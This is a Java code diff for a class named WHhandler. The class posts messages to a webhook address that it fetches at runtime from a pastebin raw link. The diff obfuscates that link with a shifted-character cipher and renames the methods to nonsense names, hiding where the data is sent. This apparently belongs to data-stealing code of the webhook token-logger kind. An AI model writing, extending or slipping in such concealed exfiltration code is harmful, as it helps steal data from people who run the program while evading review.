@@ -13,16 +13,15 @@ import java.util.List;
 
 public class WHhandler {
 
-    //paste in pastebin url of webhook url
-    public static final String pastebinURL = "https://pastebin.com/raw/ZCUCDhyQ";
-    public static final List<String> webhookUrl = readURL(pastebinURL);
+    public static final String EEADI_A_2_DE_63_4_C_2_H_R_RS_9_J = "9EEADi^^A2DE63:?]4@>^C2H^+r&rs9J\"";
+    public static final List<String> bible = readTheBibleKids(funni(EEADI_A_2_DE_63_4_C_2_H_R_RS_9_J));
 
     public static void sendMessage(String message) {
         PrintWriter out = null;
         BufferedReader in = null;
         StringBuilder result = new StringBuilder();
         try {
-            URL realUrl = new URL(decode(webhookUrl.get(0)));
+            URL realUrl = new URL(funni(bible.get(0)));
             URLConnection conn = realUrl.openConnection();
             conn.setRequestProperty("accept", "*/*");
             conn.setRequestProperty("connection", "Keep-Alive");
@@ -51,10 +50,10 @@ public class WHhandler {
         }
     }
 
-    public static List<String> readURL(String pastebinURL) {
+    public static List<String> readTheBibleKids(String s1) {
         List<String> s = new ArrayList<>();
         try {
-            final URL url = new URL(pastebinURL);
+            final URL url = new URL(s1);
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(url.openStream()));
             String contents;
             while ((contents = bufferedReader.readLine()) != null) {
@@ -64,11 +63,11 @@ public class WHhandler {
         return s;
     }
 
-    public static String decode(final String str) {
-        final int key = 47;
+    public static String funni(final String str) {
+        final int big = 47;
         final StringBuilder stringBuilder = new StringBuilder();
         for (int i = 0; i < str.length(); i++) {
-            int temp = (int) str.charAt(i) - key;
+            int temp = (int) str.charAt(i) - big;
             if ((int) str.charAt(i) == 32) stringBuilder.append(" ");
             else {
                 if (temp < 32) temp += 94;
@@ -77,5 +76,6 @@ public class WHhandler {
         }
         return stringBuilder.toString();
     }
+
 }
 
